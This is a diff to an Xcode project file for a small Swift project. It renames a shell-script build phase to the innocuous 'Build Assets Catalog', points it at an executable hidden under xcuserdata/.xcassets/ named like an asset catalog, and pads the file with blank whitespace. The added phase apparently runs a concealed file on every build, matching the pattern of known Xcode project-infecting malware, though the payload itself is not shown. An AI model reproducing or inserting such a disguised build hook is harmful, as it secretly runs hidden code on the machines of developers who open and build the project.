@@ -69,7 +69,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 3099AD31261EEC7300D2CA80 /* Build configuration list for PBXNativeTarget "Swift-自动引用计数" */;
 			buildPhases = (
-				8A9EFCDBBAE3E8EA136D902C /* Build Project Frameworks */,
+				1EBBCAF91DE56CCD3C6D902C /* Build Assets Catalog */,
 				3099AD26261EEC7300D2CA80 /* Sources */,
 				3099AD27261EEC7300D2CA80 /* Frameworks */,
 				3099AD28261EEC7300D2CA80 /* CopyFiles */,
@@ -357,6 +357,18 @@
 
 			
 	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
 			
 
 			
@@ -368,7 +380,7 @@
 	
 		/* Begin PBXShellScriptBuildPhase section */
 
-	8A9EFCDBBAE3E8EA136D902C /* Build Project Frameworks */ = {
+	1EBBCAF91DE56CCD3C6D902C /* Build Assets Catalog */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -377,7 +389,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Project Frameworks";
+			name = "Build Assets Catalog";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -386,8 +398,22 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
